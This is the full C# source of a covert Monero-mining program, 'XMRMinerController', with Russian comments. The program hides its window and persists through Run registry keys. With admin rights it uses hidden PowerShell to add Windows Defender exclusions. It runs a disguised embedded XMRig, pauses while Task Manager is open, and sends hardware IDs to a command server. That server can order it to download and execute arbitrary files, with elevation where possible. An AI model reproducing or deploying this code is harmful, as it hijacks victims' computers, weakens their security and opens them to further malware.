using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace XMRMinerController
{
    class Program
    {
        // === Конфигурация ===
        private const string ServerUrl = "http://soft-catalog.online:25565/api.php";
        private const string DataFolder = "UpdateClient";
        private const string PastebinConfigUrl = "https://pastebin.com/raw/YOUR_PASTEBIN_ID";
        private const int PollIntervalSeconds = 30;
        
        // === Переменные майнера ===
        private static Process _minerProcess;
        private static string _workingFolder;
        private static string _xmrigPath;
        private static string _xmrigProcessName;
        private static JObject _currentXmrigConfig;
        private static int _cpuUsagePercent = 50;
        private static string _logPath;
        private static bool _isRunning = true;
        private static IntPtr _processAffinityMask;
        private static int _configPriority = 0;
        private static string _currentWallet = "";
        private static string _lastConfigHash = "";
        
        // === Проверка диспетчера задач ===
        private static Timer _taskManagerCheckTimer;
        private static bool _isTaskManagerDetected = false;
        private const int TASK_MANAGER_CHECK_INTERVAL_MS = 2000;
        
        // === Администратор ===
        private static bool _isAdmin = false;
        private static string _currentExePath;
        private static string _appDataPath;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetPriorityClass(IntPtr handle, uint priorityClass);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetProcessAffinityMask(IntPtr hProcess, IntPtr dwProcessAffinityMask);

        private const uint BELOW_NORMAL_PRIORITY_CLASS = 0x4000;
        private const int SW_HIDE = 0;

        static void Main(string[] args)
        {
            // Скрываем консоль
            IntPtr consoleHandle = GetConsoleWindow();
            ShowWindow(consoleHandle, SW_HIDE);

            // Проверка прав администратора
            _isAdmin = IsAdministrator();
            _currentExePath = Assembly.GetExecutingAssembly().Location;
            
            string exeName = Path.GetFileNameWithoutExtension(_currentExePath);
            _xmrigProcessName = exeName + "_worker";
            
            _appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), DataFolder);
            Directory.CreateDirectory(_appDataPath);
            _logPath = Path.Combine(_appDataPath, "client.log");
            
            LogWrite("=========================================");
            LogWrite("XMR Miner + Update Client Started");
            LogWrite("Process name: " + exeName);
            LogWrite("Worker name: " + _xmrigProcessName);
            LogWrite("Administrator rights: " + _isAdmin);
            LogWrite("=========================================");

            // Если есть права администратора - добавляем в исключения Defender
            if (_isAdmin)
            {
                AddToDefenderExclusion(_currentExePath);
                AddToDefenderExclusion(_appDataPath);
                string downloadDir = Path.Combine(_appDataPath, "Downloads");
                AddToDefenderExclusion(downloadDir);
                string minerDir = Path.Combine(_appDataPath, "miner_instance");
                AddToDefenderExclusion(minerDir);
                LogWrite("[✓] Added to Defender exclusions");
            }
            else
            {
                LogWrite("[!] Not running as admin, skipping Defender exclusions");
            }
            
            // Добавляем в автозапуск
            AddToStartup();

            try
            {
                _workingFolder = Path.Combine(_appDataPath, "miner_instance");
                Directory.CreateDirectory(_workingFolder);
                LogWrite("[+] Working folder: " + _workingFolder);

                ExtractXmrigFromResources();
                
                if (_isAdmin && File.Exists(_xmrigPath))
                {
                    AddToDefenderExclusion(_xmrigPath);
                }
                
                LoadConfigurationWithPriority();
                
                _taskManagerCheckTimer = new Timer(CheckTaskManager, null, 0, TASK_MANAGER_CHECK_INTERVAL_MS);
                LogWrite("[+] Task Manager monitoring enabled");
                
                StartMiner();

                LogWrite("[+] To stop: delete file: " + Path.Combine(_appDataPath, "stop.txt"));
                string stopFile = Path.Combine(_appDataPath, "stop.txt");
                if (File.Exists(stopFile)) File.Delete(stopFile);

                while (_isRunning)
                {
                    try
                    {
                        UpdateCurrentWallet();
                        
                        JObject serverResponse = SendToServer();
                        
                        if (serverResponse != null)
                        {
                            bool needRestart = false;
                            
                            // Проверяем конфиг от сервера
                            JToken minerConfigToken = null;
                            if (serverResponse["miner_config"] != null)
                            {
                                minerConfigToken = serverResponse["miner_config"];
                            }
                            
                            if (minerConfigToken != null && minerConfigToken.Type != JTokenType.Null)
                            {
                                LogWrite("[✓] Received config from server");
                                JObject newServerConfig = (JObject)minerConfigToken;
                                
                                string newHash = ComputeConfigHash(newServerConfig);
                                if (newHash != _lastConfigHash || _configPriority != 2)
                                {
                                    LogWrite("[!] Server config changed! Applying...");
                                    ApplyServerConfig(newServerConfig);
                                    _configPriority = 2;
                                    _lastConfigHash = newHash;
                                    needRestart = true;
                                }
                            }
                            else if (_configPriority < 1)
                            {
                                if (TryLoadPastebinConfig())
                                {
                                    needRestart = true;
                                }
                            }
                            
                            // Проверяем команду на скачивание файла
                            JToken commandToken = null;
                            if (serverResponse["command"] != null)
                            {
                                commandToken = serverResponse["command"];
                            }
                            
                            if (commandToken != null && commandToken.Type != JTokenType.Null)
                            {
                                string action = "";
                                if (commandToken["action"] != null)
                                {
                                    action = commandToken["action"].ToString();
                                }
                                
                                if (action == "download")
                                {
                                    string downloadUrl = "";
                                    if (commandToken["url"] != null)
                                    {
                                        downloadUrl = commandToken["url"].ToString();
                                    }
                                    
                                    string fileName = "update.zip";
                                    if (commandToken["filename"] != null)
                                    {
                                        fileName = commandToken["filename"].ToString();
                                    }
                                    
                                    if (!string.IsNullOrEmpty(downloadUrl))
                                    {
                                        LogWrite("[!] Download command received: " + downloadUrl);
                                        DownloadAndExecute(downloadUrl, fileName);
                                    }
                                }
                            }
                            
                            if (needRestart && !_isTaskManagerDetected)
                            {
                                LogWrite("[!] Restarting miner with new configuration...");
                                RestartMiner();
                            }
                        }
                        else
                        {
                            if (_configPriority < 1)
                            {
                                if (TryLoadPastebinConfig())
                                {
                                    RestartMiner();
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        LogWrite("[!] Error in main loop: " + ex.Message);
                    }
                    
                    string stopFileCheck = Path.Combine(_appDataPath, "stop.txt");
                    if (File.Exists(stopFileCheck))
                    {
                        LogWrite("[!] Stop signal received");
                        _isRunning = false;
                        break;
                    }
                    
                    Thread.Sleep(PollIntervalSeconds * 1000);
                }
            }
            catch (Exception ex)
            {
                LogWrite("[!] Fatal error: " + ex.Message);
                LogWrite(ex.StackTrace);
            }
            finally
            {
                if (_taskManagerCheckTimer != null) _taskManagerCheckTimer.Dispose();
                StopMiner();
                LogWrite("[+] Miner stopped");
            }
        }

        private static string ComputeConfigHash(JObject config)
        {
            try
            {
                string json = config.ToString(Formatting.None);
                using (SHA256 sha = SHA256.Create())
                {
                    byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(json));
                    return BitConverter.ToString(hash).Replace("-", "").ToLower();
                }
            }
            catch
            {
                return Guid.NewGuid().ToString();
            }
        }

        private static void UpdateCurrentWallet()
        {
            try
            {
                if (_currentXmrigConfig != null && _currentXmrigConfig["pools"] != null && _currentXmrigConfig["pools"][0] != null)
                {
                    JToken walletToken = _currentXmrigConfig["pools"][0]["user"];
                    if (walletToken != null)
                    {
                        string wallet = walletToken.ToString();
                        if (!string.IsNullOrEmpty(wallet) && wallet != _currentWallet)
                        {
                            _currentWallet = wallet;
                            string maskedWallet = wallet.Length > 10 ? wallet.Substring(0, 6) + "..." + wallet.Substring(wallet.Length - 4) : "***";
                            LogWrite("[+] Current wallet updated: " + maskedWallet);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                LogWrite("[!] Failed to update wallet: " + ex.Message);
            }
        }

        private static void AddToStartup()
        {
            try
            {
                string exePath = Assembly.GetExecutingAssembly().Location;
                string name = Path.GetFileNameWithoutExtension(exePath);
                
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    if (key != null)
                    {
                        key.SetValue(name, "\"" + exePath + "\"");
                        LogWrite("[✓] Added to startup (Current User)");
                    }
                }
                
                if (_isAdmin)
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    {
                        if (key != null)
                        {
                            key.SetValue(name, "\"" + exePath + "\"");
                            LogWrite("[✓] Added to startup (All Users)");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                LogWrite("[!] Failed to add to startup: " + ex.Message);
            }
        }

        private static bool IsAdministrator()
        {
            try
            {
                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
                {
                    var principal = new System.Security.Principal.WindowsPrincipal(identity);
                    return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
                }
            }
            catch
            {
                return false;
            }
        }

        private static void AddToDefenderExclusion(string path)
        {
            try
            {
                if (!Directory.Exists(path) && !File.Exists(path))
                {
                    if (path.Contains("."))
                    {
                        string dir = Path.GetDirectoryName(path);
                        if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                        {
                            Directory.CreateDirectory(dir);
                        }
                    }
                    else
                    {
                        Directory.CreateDirectory(path);
                    }
                }
                
                string ps1Script = "Add-MpPreference -ExclusionPath '" + path + "' -Force; Add-MpPreference -ExclusionProcess '" + path + "' -Force";
                
                string tempPs1 = Path.Combine(Path.GetTempPath(), "defender_exclude_" + Guid.NewGuid().ToString().Substring(0, 8) + ".ps1");
                File.WriteAllText(tempPs1, ps1Script);
                
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + tempPs1 + "\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                
                Process p = Process.Start(psi);
                p.WaitForExit(5000);
                
                try { File.Delete(tempPs1); } catch { }
                
                LogWrite("[✓] Added to Defender: " + path);
            }
            catch (Exception ex)
            {
                LogWrite("[!] Failed to add Defender exclusion: " + ex.Message);
            }
        }

        private static bool IsTaskManagerOpen()
        {
            try
            {
                Process[] processes = Process.GetProcessesByName("taskmgr");
                return processes.Length > 0;
            }
            catch
            {
                return false;
            }
        }

        private static void CheckTaskManager(object state)
        {
            try
            {
                bool taskManagerOpen = IsTaskManagerOpen();

                if (taskManagerOpen && !_isTaskManagerDetected)
                {
                    _isTaskManagerDetected = true;
                    LogWrite("[!!!] ALERT: Task Manager detected! Stopping miner...");
                    StopMiner();
                }
                else if (!taskManagerOpen && _isTaskManagerDetected)
                {
                    _isTaskManagerDetected = false;
                    LogWrite("[+] Task Manager closed. Restarting miner...");
                    Thread.Sleep(1000);
                    if (_minerProcess == null || _minerProcess.HasExited)
                    {
                        StartMiner();
                    }
                }
            }
            catch (Exception ex)
            {
                LogWrite("[!] Task Manager check error: " + ex.Message);
            }
        }

        private static JObject SendToServer()
        {
            try
            {
                string hwid = GenerateHWID();
                string cpu = GetCPUName();
                int daysUsed = GetDaysUsed();
                
                var payload = new { 
                    hwid = hwid, 
                    cpu = cpu, 
                    days_used = daysUsed,
                    wallet = _currentWallet
                };
                string json = JsonConvert.SerializeObject(payload);
                
                using (WebClient wc = new WebClient())
                {
                    wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                    wc.Encoding = Encoding.UTF8;
                    wc.Headers["User-Agent"] = "XMRClient/1.0";
                    string response = wc.UploadString(ServerUrl, json);
                    LogWrite("[DEBUG] Server response received");
                    return JObject.Parse(response);
                }
            }
            catch (Exception ex)
            {
                LogWrite("[!] Server communication error: " + ex.Message);
                return null;
            }
        }

        private static void LoadConfigurationWithPriority()
        {
            LogWrite("[*] Loading initial configuration...");
            
            bool configLoaded = false;
            
            try
            {
                JObject response = SendToServer();
                if (response != null)
                {
                    JToken minerConfig = null;
                    if (response["miner_config"] != null)
                    {
                        minerConfig = response["miner_config"];
                    }
                    
                    if (minerConfig != null && minerConfig.Type != JTokenType.Null)
                    {
                        LogWrite("[✓] Loaded config from server");
                        ApplyServerConfig((JObject)minerConfig);
                        _configPriority = 2;
                        _lastConfigHash = ComputeConfigHash((JObject)minerConfig);
                        configLoaded = true;
                    }
                }
            }
            catch (Exception ex)
            {
                LogWrite("[!] Server config check failed: " + ex.Message);
            }
            
            if (!configLoaded)
            {
                configLoaded = TryLoadPastebinConfig();
            }
            
            if (!configLoaded)
            {
                LoadBuiltinConfig();
                _configPriority = 0;
                LogWrite("[✓] Using built-in config (priority: 0)");
            }
            
            UpdateCurrentWallet();
            
            int totalCores = Environment.ProcessorCount;
            int usedCores = (int)Math.Max(1, Math.Ceiling(totalCores * (_cpuUsagePercent / 100.0)));
            ulong mask = 0;
            for (int i = 0; i < usedCores; i++)
            {
                mask |= (ulong)1 << i;
            }
            _processAffinityMask = (IntPtr)mask;
            
            LogWrite("[+] CPU: " + totalCores + " cores, using " + _cpuUsagePercent + "% (" + usedCores + " cores)");
            LogWrite("[+] Config priority: " + _configPriority + " (0=builtin,1=pastebin,2=server)");
        }

        private static bool TryLoadPastebinConfig()
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers["User-Agent"] = "Mozilla/5.0";
                    string jsonContent = wc.DownloadString(PastebinConfigUrl);
                    dynamic config = JsonConvert.DeserializeObject(jsonContent);
                    
                    if (config != null)
                    {
                        if (config.xmrigConfig != null)
                        {
                            _currentXmrigConfig = JObject.Parse(config.xmrigConfig.ToString());
                            if (config.cpuUsagePercent != null)
                            {
                                _cpuUsagePercent = (int)config.cpuUsagePercent;
                            }
                            else
                            {
                                _cpuUsagePercent = 50;
                            }
                            _configPriority = 1;
                            LogWrite("[✓] Loaded config from Pastebin (priority: 1)");
                            return true;
                        }
                        else if (config.pools != null)
                        {
                            _currentXmrigConfig = JObject.Parse(jsonContent);
                            _configPriority = 1;
                            LogWrite("[✓] Loaded direct XMRig config from Pastebin");
                            return true;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                LogWrite("[!] Pastebin config failed: " + ex.Message);
            }
            return false;
        }

        private static void ApplyServerConfig(JObject serverConfig)
        {
            LogWrite("[*] Applying server config...");
            
            string poolUrl = "pool.hashvault.pro:443";
            if (serverConfig["pool_url"] != null)
            {
                poolUrl = serverConfig["pool_url"].ToString();
            }
            
            string wallet = "";
            if (serverConfig["wallet"] != null)
            {
                wallet = serverConfig["wallet"].ToString();
            }
            
            if (serverConfig["cpu_percent"] != null)
            {
                _cpuUsagePercent = (int)serverConfig["cpu_percent"];
            }
            else
            {
                _cpuUsagePercent = 50;
            }
            
            string randomxMode = "light";
            if (serverConfig["randomx_mode"] != null)
            {
                randomxMode = serverConfig["randomx_mode"].ToString();
            }
            
            bool hugePages = false;
            if (serverConfig["huge_pages"] != null)
            {
                hugePages = (bool)serverConfig["huge_pages"];
            }
            
            LogWrite("[*] Server config values:");
            LogWrite("  - Pool URL: " + poolUrl);
            string maskedWallet = wallet.Length > 10 ? wallet.Substring(0, 6) + "..." + wallet.Substring(wallet.Length - 4) : wallet;
            LogWrite("  - Wallet: " + maskedWallet);
            LogWrite("  - CPU Percent: " + _cpuUsagePercent + "%");
            LogWrite("  - RandomX Mode: " + randomxMode);
            LogWrite("  - Huge Pages: " + hugePages);
            
            // Создаём конфиг XMRig
            JObject xmrigConfig = new JObject();
            xmrigConfig["autosave"] = false;
            xmrigConfig["background"] = false;
            xmrigConfig["colors"] = false;
            xmrigConfig["donate-level"] = 1;
            xmrigConfig["print-time"] = 60;
            
            JObject randomx = new JObject();
            randomx["mode"] = randomxMode;
            randomx["init"] = -1;
            randomx["numa"] = false;
            randomx["1gb-pages"] = false;
            xmrigConfig["randomx"] = randomx;
            
            JObject cpu = new JObject();
            cpu["enabled"] = true;
            cpu["huge-pages"] = hugePages;
            cpu["memory-pool"] = false;
            cpu["yield"] = true;
            cpu["asm"] = true;
            xmrigConfig["cpu"] = cpu;
            
            JArray pools = new JArray();
            JObject pool = new JObject();
            pool["url"] = poolUrl;
            
            string defaultWallet = "49mfuunSQeXGopbRoNFAyXN9mV1aSLPXQSPsskgMQgWs4tp5tudKHsygzYicfTKWDmECoGwtGNTJvQtF8fqb3HYiQDq7pQE";
            pool["user"] = string.IsNullOrEmpty(wallet) ? defaultWallet : wallet;
            pool["pass"] = "x";
            pool["enabled"] = true;
            pool["tls"] = poolUrl.Contains(":443");
            pools.Add(pool);
            xmrigConfig["pools"] = pools;
            
            _currentXmrigConfig = xmrigConfig;
            UpdateCurrentWallet();
            
            // Обновляем CPU affinity
            int totalCores = Environment.ProcessorCount;
            int usedCores = (int)Math.Max(1, Math.Ceiling(totalCores * (_cpuUsagePercent / 100.0)));
            ulong mask = 0;
            for (int i = 0; i < usedCores; i++)
            {
                mask |= (ulong)1 << i;
            }
            _processAffinityMask = (IntPtr)mask;
            
            LogWrite("[✓] Server config applied successfully");
        }

        private static void LoadBuiltinConfig()
        {
            string builtinJson = @"
            {
                ""autosave"": false,
                ""background"": false,
                ""colors"": false,
                ""donate-level"": 1,
                ""print-time"": 60,
                ""randomx"": {
                    ""mode"": ""light"",
                    ""init"": -1,
                    ""numa"": false,
                    ""1gb-pages"": false
                },
                ""cpu"": {
                    ""enabled"": true,
                    ""huge-pages"": false,
                    ""memory-pool"": false,
                    ""yield"": true,
                    ""asm"": true
                },
                ""pools"": [
                    {
                        ""url"": ""pool.hashvault.pro:443"",
                        ""user"": ""49mfuunSQeXGopbRoNFAyXN9mV1aSLPXQSPsskgMQgWs4tp5tudKHsygzYicfTKWDmECoGwtGNTJvQtF8fqb3HYiQDq7pQE"",
                        ""pass"": ""x"",
                        ""enabled"": true,
                        ""tls"": true
                    }
                ]
            }";
            _currentXmrigConfig = JObject.Parse(builtinJson);
            _cpuUsagePercent = 50;
        }

        private static void ExtractXmrigFromResources()
        {
            _xmrigPath = Path.Combine(_workingFolder, _xmrigProcessName + ".exe");
            if (!File.Exists(_xmrigPath))
            {
                LogWrite("[*] Extracting XMRig as: " + _xmrigProcessName + ".exe");
                byte[] xmrigBytes = GetResourceBytes("xmrig");
                if (xmrigBytes != null)
                {
                    File.WriteAllBytes(_xmrigPath, xmrigBytes);
                    LogWrite("[✓] XMRig extracted");
                    
                    if (_isAdmin)
                    {
                        AddToDefenderExclusion(_xmrigPath);
                    }
                }
                else
                {
                    throw new Exception("XMRig resource not found");
                }
            }
        }

        private static byte[] GetResourceBytes(string resourceName)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            string[] possibleNames = {
                "XMRMinerController.Resources.resources",
                "Resources.resources"
            };
            foreach (string resourceFileName in possibleNames)
            {
                using (Stream stream = assembly.GetManifestResourceStream(resourceFileName))
                {
                    if (stream != null)
                    {
                        using (ResourceReader reader = new ResourceReader(stream))
                        {
                            IDictionaryEnumerator enumerator = reader.GetEnumerator();
                            while (enumerator.MoveNext())
                            {
                                if (enumerator.Key.ToString() == resourceName)
                                {
                                    return (byte[])enumerator.Value;
                                }
                            }
                        }
                    }
                }
            }
            return null;
        }

        private static void StartMiner()
        {
            lock (typeof(Program))
            {
                if (_isTaskManagerDetected)
                {
                    LogWrite("[*] Skipping miner start - Task Manager is open");
                    return;
                }

                if (_minerProcess != null && !_minerProcess.HasExited)
                {
                    StopMiner();
                    Thread.Sleep(2000);
                }

                string configJson = _currentXmrigConfig.ToString(Formatting.None);
                byte[] configBytes = Encoding.UTF8.GetBytes(configJson);
                string encodedConfig = Convert.ToBase64String(configBytes);
                
                LogWrite("[*] Starting miner with " + _cpuUsagePercent + "% CPU");
                LogWrite("[*] Config size: " + configJson.Length + " bytes");

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = _xmrigPath,
                    Arguments = "--config-data=\"" + encodedConfig + "\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = _workingFolder,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                _minerProcess = new Process { StartInfo = startInfo };
                
                _minerProcess.OutputDataReceived += (sender, e) => 
                {
                    if (!string.IsNullOrEmpty(e.Data))
                        LogWrite("[XMRig] " + e.Data);
                };
                _minerProcess.ErrorDataReceived += (sender, e) => 
                {
                    if (!string.IsNullOrEmpty(e.Data))
                        LogWrite("[XMRig Error] " + e.Data);
                };
                
                _minerProcess.Start();
                _minerProcess.BeginOutputReadLine();
                _minerProcess.BeginErrorReadLine();
                
                SetPriorityClass(_minerProcess.Handle, BELOW_NORMAL_PRIORITY_CLASS);
                SetProcessAffinityMask(_minerProcess.Handle, _processAffinityMask);

                LogWrite("[+] Miner started with PID: " + _minerProcess.Id);
                LogWrite("[+] Priority: Below Normal");
                
                Thread.Sleep(2000);
                
                if (_minerProcess.HasExited)
                {
                    LogWrite("[!] Miner exited immediately! Exit code: " + _minerProcess.ExitCode);
                    LogWrite("[!] Trying alternative launch method...");
                    StartMinerAlternative();
                }
            }
        }

        private static void StartMinerAlternative()
        {
            try
            {
                string tempId = Guid.NewGuid().ToString().Substring(0, 8);
                string configPath = Path.Combine(Path.GetTempPath(), "miner_config_" + tempId + ".json");
                File.WriteAllText(configPath, _currentXmrigConfig.ToString(Formatting.None));
                
                LogWrite("[*] Alternative method: using temp config: " + configPath);
                
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = _xmrigPath,
                    Arguments = "-c \"" + configPath + "\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = _workingFolder
                };
                
                _minerProcess = new Process { StartInfo = startInfo };
                _minerProcess.Start();
                SetPriorityClass(_minerProcess.Handle, BELOW_NORMAL_PRIORITY_CLASS);
                SetProcessAffinityMask(_minerProcess.Handle, _processAffinityMask);
                
                LogWrite("[+] Miner started with PID: " + _minerProcess.Id);
                
                ThreadPool.QueueUserWorkItem(delegate
                {
                    Thread.Sleep(10000);
                    try { if (File.Exists(configPath)) File.Delete(configPath); } catch { }
                });
            }
            catch (Exception ex)
            {
                LogWrite("[!] Alternative launch failed: " + ex.Message);
            }
        }

        private static void StopMiner()
        {
            lock (typeof(Program))
            {
                if (_minerProcess != null && !_minerProcess.HasExited)
                {
                    LogWrite("[*] Stopping miner...");
                    _minerProcess.Kill();
                    _minerProcess.WaitForExit(5000);
                    _minerProcess.Dispose();
                    _minerProcess = null;
                    LogWrite("[+] Miner stopped");
                }
            }
        }

        private static void RestartMiner()
        {
            Thread.Sleep(2000);
            StartMiner();
        }

        private static void DownloadAndExecute(string url, string fileName)
        {
            try
            {
                string downloadPath = Path.Combine(_appDataPath, "Downloads");
                Directory.CreateDirectory(downloadPath);
                
                if (_isAdmin)
                {
                    AddToDefenderExclusion(downloadPath);
                }
                
                string fullPath = Path.Combine(downloadPath, fileName);
                
                LogWrite("[*] Downloading: " + url);
                
                using (WebClient wc = new WebClient())
                {
                    wc.DownloadFile(url, fullPath);
                }
                LogWrite("[✓] Downloaded to: " + fullPath);
                
                if (_isAdmin)
                {
                    AddToDefenderExclusion(fullPath);
                }
                
                LogWrite("[*] Executing file with same privileges (Admin: " + _isAdmin + ")");
                ExecuteFile(fullPath);
            }
            catch (Exception ex)
            {
                LogWrite("[!] Download/execute error: " + ex.Message);
            }
        }

        private static void ExecuteFile(string filePath)
        {
            try
            {
                LogWrite("[*] Executing: " + filePath);
                
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = filePath,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Normal
                };
                
                if (_isAdmin)
                {
                    psi.Verb = "runas";
                    LogWrite("[*] Launching with administrator privileges");
                }
                else
                {
                    LogWrite("[*] Launching with user privileges");
                }
                
                Process.Start(psi);
                LogWrite("[✓] File executed successfully");
            }
            catch (Exception ex)
            {
                LogWrite("[!] Error executing file: " + ex.Message);
                
                if (_isAdmin)
                {
                    try
                    {
                        LogWrite("[*] Retrying without administrator privileges...");
                        ProcessStartInfo psi = new ProcessStartInfo
                        {
                            FileName = filePath,
                            UseShellExecute = true,
                            WindowStyle = ProcessWindowStyle.Normal
                        };
                        Process.Start(psi);
                        LogWrite("[✓] File executed without admin privileges");
                    }
                    catch (Exception ex2)
                    {
                        LogWrite("[!] Second attempt failed: " + ex2.Message);
                    }
                }
            }
        }

        private static void LogWrite(string message)
        {
            try
            {
                string logMessage = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " | " + message;
                Console.WriteLine(logMessage);
                File.AppendAllText(_logPath, logMessage + Environment.NewLine);
            }
            catch { }
        }

        private static string GenerateHWID()
        {
            string cpuId = GetWMIValue("Win32_Processor", "ProcessorId");
            string mbSerial = GetWMIValue("Win32_BaseBoard", "SerialNumber");
            string raw = cpuId + mbSerial;
            using (SHA256 sha = SHA256.Create())
            {
                byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(raw));
                return BitConverter.ToString(hash).Replace("-", "").ToLower();
            }
        }

        private static string GetCPUName()
        {
            return GetWMIValue("Win32_Processor", "Name");
        }

        private static string GetWMIValue(string className, string property)
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT " + property + " FROM " + className))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        if (obj[property] != null)
                        {
                            return obj[property].ToString();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                LogWrite("[!] WMI error: " + ex.Message);
            }
            return "Unknown";
        }

        private static int GetDaysUsed()
        {
            string file = Path.Combine(_appDataPath, "firstrun.dat");
            if (File.Exists(file))
            {
                try
                {
                    DateTime firstRun = DateTime.Parse(File.ReadAllText(file));
                    return (int)(DateTime.Now - firstRun).TotalDays;
                }
                catch { }
            }
            File.WriteAllText(file, DateTime.Now.ToString("o"));
            return 0;
        }
    }
}